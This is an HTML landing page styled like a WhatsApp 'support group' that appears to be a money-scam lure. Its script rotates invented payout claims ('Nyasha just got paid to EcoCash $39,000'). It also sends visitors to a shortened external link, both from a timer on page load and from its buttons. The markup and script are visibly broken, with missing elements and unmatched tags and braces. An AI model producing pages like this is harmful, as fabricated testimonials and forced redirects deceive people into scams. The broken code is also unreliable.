<!DOCTYPE html>

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>United States Support group</title>

<style>
:root{
--bg:#f6f8f9;--card:#fff;--text:#1d2433;--muted:#8a93a4;
--accent:#10b981;--dark:#1f2937;--wa:#25D366;
--shadow:0 10px 20px rgba(2,8,23,.06)
}
*{box-sizing:border-box}
body{
margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
background:var(--bg);color:var(--text)
}
.card{
width:min(420px,100%);padding:22px;text-align:center;
background:var(--card);border-radius:26px;box-shadow:var(--shadow)
}

/* WHATSAPP LOGO */
.wa{
width:70px;height:70px;margin:0 auto 10px;
display:flex;align-items:center;justify-content:center;
background:var(--wa);border-radius:22px
}
.wa img{
width:38px;height:38px;object-fit:contain
}

h1{margin:0 0 12px;font-size:24px}

.note{
background:#eef6f3;padding:12px;border-radius:14px;
font-size:15px;margin-bottom:10px;
color:#047857;font-weight:700
}

.online{
font-size:13px;font-weight:800;color:#0b8366;
margin:14px 0 10px
}

/* AVATARS */
.avatars{
display:flex;justify-content:center;gap:14px;margin-bottom:14px
}
.avatar{
width:54px;height:54px;border-radius:50%;
padding:3px;background:#22c55e
}
.avatar img{
width:100%;height:100%;border-radius:50%;
object-fit:cover;background:#fff
}

.q{
color:#6b7280;font-weight:800;
margin:14px 0 10px;font-size:18px
}

.switch{
display:flex;gap:12px;justify-content:center;margin-bottom:18px
}
.chip{
padding:12px 18px;border-radius:14px;
background:#eef1f5;font-weight:900;
cursor:pointer;min-width:100px;
transition:.2s
}
.chip.active{
background:#dcfce7;color:#065f46;
border:2px solid #22c55e
}

.btn{
width:100%;border:0;border-radius:16px;
padding:16px;font-size:17px;font-weight:900;
cursor:pointer;margin-bottom:12px
}
.primary{background:var(--accent);color:#fff}
.dark{background:var(--dark);color:#fff}

footer{
font-size:12px;color:#9aa3b2;margin-top:14px
}
footer a{
color:var(--accent);text-decoration:none;font-weight:700
}
</style>
</head>

<body>

<div class="card">

  </div>

  Chat Now to Recieve your own</h1>

</div>

<script>
const LINK = "https://ln.run/Kro_f";

const NAMES=[
["Nyasha",39000],
["Kudakwashe",42000],
["Patience",51500],
["Wisdom",28000]
];

let i=0;
setInterval(()=>{
  const n=NAMES[i++%NAMES.length];
  document.getElementById("note").textContent =
  `${n[0]} just got paid to EcoCash $${n[1].toLocaleString()}`;

      window.location.href = LINK;
    },300);

});

// Buttons redirect
document.getElementById("start").onclick =
document.getElementById("join").onclick = ()=>{
  window.location.href = LINK;
};
</script>

</body>
</html>
